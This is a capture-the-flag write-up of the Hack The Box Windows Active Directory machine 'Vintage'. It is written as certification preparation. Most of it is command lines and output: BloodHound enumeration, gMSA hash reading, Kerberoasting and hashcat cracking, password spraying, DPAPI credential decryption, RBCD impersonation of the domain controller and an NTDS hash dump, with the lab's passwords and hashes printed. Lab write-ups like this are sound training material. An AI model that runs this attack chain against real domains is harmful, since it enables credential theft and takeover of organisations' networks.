---
title: "HTB Vintage"
date: 2026-05-22 16:36 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Hard]
image: /assets/img/posts/vintage/vintage.png
---

**HTB Vintage** is an assume-breach Windows `Active Directory` machine that starts with `BloodHound` enumeration to discover a weak `FS01$` computer account password, reading a `gMSA` password to obtain `gMSA01$`'s hash, adding it to `ServiceManagers` to enable and `Kerberoast` a service account, password spraying to pivot to `C.Neri`, decrypting `DPAPI` credentials with `pypykatz` to recover `c.neri_adm`'s password, and escalating to `Domain Admin` by abusing `RBCD` with `FS01$` to impersonate `DC01$` and extract `L.Bianchi_adm`'s hash via `DCSync`.

## Machine Information

As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account:

```
P.Rosa
```
```
Rosaisbest123
```

## Reconnaissance

### Scanning

- Nmap Scripts & Version (1000 ports)

```
nmap -sCV 10.129.231.205 --min-rate 1000 -nv -oA nmap/nmap_all
```

```
# Nmap 7.99 scan initiated Fri May 22 11:50:37 2026 as: /usr/lib/nmap/nmap --privileged -sCV --min-rate 1000 -nv -oA nmap/nmap_all 10.129.231.205
Nmap scan report for 10.129.231.205
Host is up (0.19s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-22T15:51:00
|_  start_date: N/A
|_clock-skew: -2s
```

### Configuration

- /etc/hosts

```bash
sudo nxc smb 10.129.231.205 --generate-hosts-file /etc/hosts
```

- /etc/krb5.conf

```bash
sudo nxc smb dc01.vintage.htb --generate-krb5-file /etc/krb5.conf
```

- time

```bash
sudo ntpdate -u dc01.vintage.htb
```

### SMB

```
nxc smb dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\p.rosa:Rosaisbest123
```

### Bloodhound-python

```
bloodhound-python -c All -u 'p.rosa' -p 'Rosaisbest123' -k -ns 10.129.231.205 -d vintage.htb -dc dc01.vintage.htb --zip
```

### BloodHound-CE / NXC / BloodyAD

- `FS01$`

![fs01](/assets/img/posts/vintage/fs01.png)

```
➜  Vintage nxc ldap dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k -M dump-computers                                         
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\p.rosa:Rosaisbest123 
DUMP-COM... dc01.vintage.htb 389    DC01             [+] Found the following computers:
DUMP-COM... dc01.vintage.htb 389    DC01             dc01.vintage.htb (Windows Server 2022 Standard)
DUMP-COM... dc01.vintage.htb 389    DC01             FS01.vintage.htb (Unknown OS)
➜  Vintage nxc ldap dc01.vintage.htb -u 'fs01$' -p 'fs01' -k                                                                     
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\fs01$:fs01
```

![fs01-1](/assets/img/posts/vintage/fs01-1.png)

```
➜  Vintage nxc ldap dc01.vintage.htb -u 'fs01$' -p 'fs01' -k --gmsa
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\fs01$:fs01 
LDAP        dc01.vintage.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.vintage.htb 389    DC01             Account: gMSA01$              NTLM: 09945b851c5a0c5b1c60c68378820dfe     PrincipalsAllowedToReadPassword: Domain Computers
```

![gmsa01](/assets/img/posts/vintage/gmsa01.png)

```
bloodyAD -u 'gmsa01$' -p '09945b851c5a0c5b1c60c68378820dfe' -f rc4 -k -d vintage.htb --host dc01.vintage.htb add groupMember "ServiceManagers" "gmsa01$"
```

![gmsa02](/assets/img/posts/vintage/gmsa02.png)

```
bloodyAD -u 'gmsa01$' -p '09945b851c5a0c5b1c60c68378820dfe' -f rc4 -k -d vintage.htb --host dc01.vintage.htb remove uac 'svc_sql' -f ACCOUNTDISABLE
bloodyAD -u 'gmsa01$' -p '09945b851c5a0c5b1c60c68378820dfe' -f rc4 -k -d vintage.htb --host dc01.vintage.htb set object 'svc_sql' servicePrincipalName -v 'mssql/done'
impacket-getTGT 'vintage.htb/gmsa01$' -hashes :09945b851c5a0c5b1c60c68378820dfe -dc-ip 10.129.231.205
export KRB5CCNAME=gmsa01\$.ccache
impacket-GetUserSPNs 'vintage.htb/gmsa01$' -k -no-pass -dc-host dc01.vintage.htb -request -outputfile hash.txt
hashcat -a 0 hash.txt rockyou.txt -d 1 -O
```
```
svc_sql:Zer0the0ne
```

### Password Spray

```
nxc ldap dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k --users-export users.txt
nxc smb dc01.vintage.htb -u users.txt -p 'Zer0the0ne' -k --continue-on-success
....
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne
```

![neri](/assets/img/posts/vintage/neri.png)

### shell as c.neri

```
impacket-getTGT 'vintage.htb/c.neri:Zer0the0ne' -dc-ip 10.129.231.205
export KRB5CCNAME=c.neri.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

```
C:\Users\C.Neri> gci -force
cd appdata/roaming/microsoft/credentials
C4BB96844A5C9DD45D5B6A9859252BA6
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\C4BB96844A5C9DD45D5B6A9859252BA6"))
C:\Users\C.Neri\appdata\roaming\microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115>
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))
  Vintage cat credsblob.b64 | base64 -d > credsblob
  Vintage cat dpapiblob1.b64 | base64 -d > dpapiblob1
  Vintage cat dpapiblob2.b64 | base64 -d > dpapiblob2
pypykatz dpapi prekey password 'S-1-5-21-4024337825-2033394866-2055507597-1115' 'Zer0the0ne' | tee pkf
  Vintage pypykatz dpapi masterkey dpapiblob1 pkf -o mkf1                                                                                                   
  Vintage pypykatz dpapi masterkey dpapiblob2 pkf -o mkf2
  Vintage pypykatz dpapi credential mkf2 credsblob
type : GENERIC (1)
last_written : 133622465035169458
target : LegacyGeneric:target=admin_acc
username : vintage\c.neri_adm
unknown4 : Uncr4ck4bl3P4ssW0rd0312
```
```
c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
```

## RBCD

![allowed](/assets/img/posts/vintage/allowed.png)

```
Vintage kinit c.neri_adm 
Password for c.neri_adm@VINTAGE.HTB: 
  Vintage klist           
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: c.neri_adm@VINTAGE.HTB
Valid starting       Expires              Service principal
05/22/2026 14:44:16  05/23/2026 00:44:16  krbtgt/VINTAGE.HTB@VINTAGE.HTB
renew until 05/23/2026 14:44:09
```

```
  Vintage kinit fs01$
Password for fs01$@VINTAGE.HTB: 
  Vintage klist      
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: fs01$@VINTAGE.HTB

Valid starting       Expires              Service principal
05/22/2026 14:47:14  05/23/2026 00:47:14  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 05/23/2026 14:47:07
  Vintage impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' 'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

```
nxc smb dc01.vintage.htb -k --use-kcache --ntds --user l.bianchi_adm
SMB         dc01.vintage.htb 445    dc01             L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
nxc ldap dc01.vintage.htb -u 'p.rosa' -p 'Rosaisbest123' -k --groups "Domain Admins"        
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\p.rosa:Rosaisbest123 
LDAP        dc01.vintage.htb 389    DC01             Administrator
LDAP        dc01.vintage.htb 389    DC01             L.Bianchi_adm
```

